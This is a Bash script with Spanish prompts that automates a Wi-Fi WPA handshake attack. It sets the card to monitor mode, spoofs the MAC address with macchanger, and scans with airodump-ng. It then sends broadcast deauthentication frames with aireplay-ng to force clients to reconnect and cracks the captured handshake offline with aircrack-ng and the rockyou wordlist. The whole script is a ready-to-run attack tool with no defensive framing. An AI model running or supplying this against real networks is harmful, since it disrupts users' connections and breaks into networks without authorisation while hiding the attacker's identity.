#!/bin/bash 
#
#Author: JuliostitoDeuss
#
trap ctrl_c INT 

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

function ctrl_c (){
	echo -e "\n${grayColour}[*]${endColour}${yellowColour} Saliendo...${endColour}"
	tput cnorm; airmon-ng stop ${networkCard}mon >/dev/null 2>&1
	rm Captura* 2>/dev/null
	exit 0
}

function helpPanel() {
	echo -e "\n\t${redColour}[*] Uso ./scriptWifi${endColour}" 
	for i in {1..120}; do echo -ne  "${redColour}-${endColour}"; done
	echo -e "\n\t\t${redColour}[-a]${endColour}${yellowColour} Modo de ataque${endColour}" 
	echo -e "\t\t${purpleColour} handshake${endColour}" 
#	echo -e "\t\t${purpleColour} PKMID${endColour}"
	echo -e "\n\t\t${redColour}[-n]${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}"
	echo -e "\n\t\t${redColour}[-h]${endColour}${yellowColour} Mostrar este panel de ayuda${endColour}"
}

function dependencies() {
	tput civis
	clear; dependencies=(aircrack-ng macchanger) 

	echo -e "${yellowColour}[*]${endColour}${blueColour} Comprobando programas necesarios...${endColour}"
	
	sleep 2

	for program in "${dependencies[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} ${program}${endColour}${prupleColour}...${endColour}" 

		test -f /usr/bin/$program 

		if [ "$(echo $?)" == "0" ]; then
		echo -e "${greenColour}(V)${endColour}"
		else
		echo -e "${redColour}(X)${endColour}\n"
		echo -e "${yellowColour}Instalando Herramienta${endColour}${greenColour} $program${endColour}${yellowColour} ...${endColour}"
		apt-get install $program -y >/dev/null 2>&1 
		fi; sleep 1
	done	
}

function startAttack() {
	clear
	echo -e "${yellowColour}[*]${endColour}${blueColour} Configurando tarjeta de red ...${endColour}"
	airmon-ng start $networkCard >/dev/null 2>&1
        ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon >/dev/null 2>&1
        ifconfig ${networkCard}mon up; killall dhclient wpa_supplicant 2>/dev/null
	echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva direccion MAC asignada:${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | cut -d' ' -f '5-100')${endColour}${purpleColour}]${endColour}"

	if [ "${attack_mode}" == "handshake" ]; then
	xterm -hold -e "airodump-ng ${networkCard}mon" &
	airodump_xterm_PID=$!
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel
	kill -9 $airodump_xterm_PID
	wait $airodump_xterm_PID 2>/dev/null

	xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" &
	airodump_filter_xterm_PID=$!

	sleep 5; xterm -hold -e "aireplay-ng -0 15 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
	aireplay_xterm_PID=$!
	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

	sleep 8; kill -9 $airodump_filter_xterm_PID 
	wait $airodump_filter_xterm_PID 2>/dev/null

	xterm -hold -e "aircrack-ng -w /home/julio/Descargas/rockyou.txt Captura-01.cap" &
	else 
	helpPanel
	fi
}

#Main Function 

if [ "$(id -u)" == "0" ]; then 
declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do 
	case $arg in
	a) attack_mode=$OPTARG; let parameter_counter+=1
	;;
 	n) networkCard=$OPTARG; let parameter_counter+=1 
	;;
	h)
	helpPanel
	;;
	esac 
    done 
    	if [ "$parameter_counter" -eq "0" ]; then
	helpPanel
	else
		dependencies
		startAttack
		tput cnorm; airmon-ng stop ${networkCard}mon >/dev/null 2>&1
	fi
else 
	echo -e "\n${redColour}Fuera hermano, no tienes privilegios${endColour}"
fi























